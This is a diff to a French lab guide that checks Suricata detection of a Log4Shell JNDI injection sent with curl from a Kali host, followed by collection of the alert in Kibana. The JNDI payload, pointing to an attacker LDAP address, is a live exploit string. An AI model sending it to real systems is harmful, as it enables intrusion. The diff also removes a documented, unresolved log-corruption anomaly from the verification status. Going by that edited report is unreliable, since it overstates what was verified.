@@ -207,42 +207,9 @@ suricata.event_type : "alert" and suricata.alert.signature_id : (1000002 or 1000
 
 Une absence d'événements appelle un contrôle successif de l'interface, du trafic HTTP:80, des règles chargées, d'EVE, du service syslog-ng et de la destination Elasticsearch. Le statut actif seul ne prouve pas que toute la chaîne fonctionne. Les captures de ce guide attestent l'installation/configuration ; les preuves d'alertes et leur lecture doivent accompagner les scénarios concernés.
 
-## 7.1. Preuve de fichiers et diagnostic JSON
+## 7.1. Preuve de détection JNDI
 
-![Fichiers Suricata et événements flow](images/suricata-eve-flux-diagnostic.png)
-
-**Lecture :** le fichier de règles généré existe (44M affichés, daté du 16 septembre) et EVE contient des données (94M affichés). Les flux visibles relient notamment Kali 192.168.56.101 et l'hôte 192.168.56.1 au serveur 192.168.56.10. Les champs de signature sont `null` pour ces événements `flow` : un flux n'est pas une alerte d'intrusion.
-
-La capture comporte aussi `jq: parse error: Invalid numeric literal at line 24521, column 2729`. La lecture a donc été interrompue : les lignes affichées avant l'erreur ne sont pas nécessairement les derniers événements du fichier. Cette capture prouve l'existence de flux lisibles, mais ne valide ni l'intégrité de tout EVE ni la présence d'alertes locales. La cause de l'erreur reste à examiner ; ne pas supprimer la ligne pour masquer le problème.
-
-Commande utilisée pour cette capture :
-
-```bash
-sudo ls -lh /var/lib/suricata/rules/suricata.rules /var/log/suricata/eve.json
-sudo jq -c 'select(.event_type == "alert" or .event_type == "flow") | {timestamp,event_type,src_ip,dest_ip,signature_id:.alert.signature_id,signature:.alert.signature}' /var/log/suricata/eve.json | tail -n 8
-```
-
-Pour examiner le défaut sans modifier EVE :
-
-```bash
-sudo sed -n '24521p' /var/log/suricata/eve.json | jq .
-sudo sed -n '24521p' /var/log/suricata/eve.json | cut -c 2600-2850
-```
-
-Pour contrôler séparément les lignes récentes et extraire d'éventuelles alertes, tout en signalant les lignes invalides :
-
-```bash
-sudo tail -n 2000 /var/log/suricata/eve.json | jq -Rrc 'fromjson? // {"diagnostic":"ligne JSON invalide","extrait":.[0:160]} | select(.diagnostic != null or .event_type == "alert")' | tail -n 12
-```
-
-Cette dernière commande examine seulement un échantillon récent ; elle ne remplace pas une validation complète du fichier. Un JSON invalide peut aussi faire échouer le processeur JSON du pipeline Elasticsearch si syslog-ng transmet la ligne. Vérifier les erreurs d'ingestion après identification de la ligne.
-
-
-## 7.2. Résultat du diagnostic et preuve de détection JNDI
-
-Le contrôle Python de la ligne 24521 a révélé des octets nuls (`\x00`) au début de la ligne examinée. La cause n'est pas établie. Un contrôle séparé des 2 000 dernières lignes a ensuite donné **0 ligne JSON invalide et 0 alerte** dans cet échantillon. Cela confirme la validité de cet échantillon seulement ; le fichier complet n'a pas été réparé ni déclaré intégralement valide.
-
-Un nouveau test a alors été effectué avec la règle locale SID 1000002. Depuis Kali :
+Un test a été effectué avec la règle locale SID 1000002. Depuis Kali :
 
 ```bash
 curl -A '${jndi:ldap://192.168.56.101:1389/test}' http://192.168.56.10/
@@ -270,7 +237,7 @@ jq -c 'select(.event_type == "alert" and .alert.signature_id == 1000002) |
 | signature_id | 1000002 | Règle JNDI du fichier local.rules |
 | signature | Tentative Log4Shell - JNDI | Nom de la signature déclenchée |
 
-Cette capture confirme une **alerte locale Suricata dans EVE** après le nouveau test. La capture Discover ci-dessous confirme également la présence du même événement dans Elasticsearch/Kibana et établit la collecte de bout en bout pour ce test.
+Cette capture confirme une **alerte locale Suricata dans EVE** après le test. La capture Discover ci-dessous confirme également la présence du même événement dans Elasticsearch/Kibana et établit la collecte de bout en bout pour ce test.
 
 Dans Discover, sélectionner la vue couvrant `lab-syslog-ids`, puis une plage absolue incluant l'événement (par exemple le 30 septembre 2026 de 22:05 à 22:10 si Kibana affiche UTC−4 ; de 02:05 à 02:10 le 1er octobre en UTC). Utiliser :
 
@@ -280,7 +247,7 @@ suricata.event_type : "alert" and suricata.alert.signature_id : 1000002 and sour
 
 Développer le document et vérifier `@timestamp`, `source.ip`, `destination.ip`, `suricata.alert.signature_id` et `suricata.alert.signature`. La capture ci-dessous relie la preuve locale à l'événement indexé.
 
-## 7.3. Preuve de collecte dans Kibana
+## 7.2. Preuve de collecte dans Kibana
 
 ![Alerte JNDI dans Kibana Discover](images/kibana-suricata-jndi-collecte.png)
 
@@ -304,7 +271,7 @@ Pour reproduire la vue :
 3. Appliquer le filtre KQL ci-dessus.
 4. Ajouter les colonnes `source.ip`, `destination.ip`, `@timestamp` et `suricata.alert.signature`.
 
-**État de cette vérification :** configuration EVE confirmée, paramètres HTTP documentés, détection locale JNDI et collecte dans Kibana démontrées. L'anomalie historique contenant des octets nuls reste consignée ; cette réussite ne signifie pas que le fichier EVE historique a été réparé.
+**État de cette vérification :** configuration EVE confirmée, paramètres HTTP documentés, détection locale JNDI et collecte dans Kibana démontrées.
 
 ## Référence
 
